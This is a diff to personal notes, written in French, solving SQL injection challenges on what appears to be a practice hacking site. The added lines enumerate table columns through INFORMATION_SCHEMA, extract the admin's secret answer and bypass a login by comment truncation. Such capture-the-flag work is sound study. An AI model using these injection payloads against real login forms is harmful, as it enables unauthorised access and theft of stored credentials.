@@ -286,11 +286,19 @@ login : administrator
 password : ' or '1'='1
 
 #SQL Challenge 2
-login : admin 
-password : ' or '1'='1
-==> login en tant que us3r
-rafraichir la page => login en tant qu'admin ???
-TODO
+on injecte dans le champ login :
+' union SELECT COLUMN_NAME,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='security'; -- 
+==> champ answer dans la table security
+
+' union SELECT COLUMN_NAME,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='security' limit 1,1; -- 
+==> champ name dans la table security
+
+' union SELECT answer,1 FROM security where name='admin'; -- 
+==> réponse à la question pour l'utilisateur admin : freeman
+
+login en tant qu'admin :
+admin'; -- 
+utiliser la réponse à la question (freeman)
 
 #Encryption Challenge 1
 As a young boy, I was taught in high school that hacking was cool. http://urldecode.org
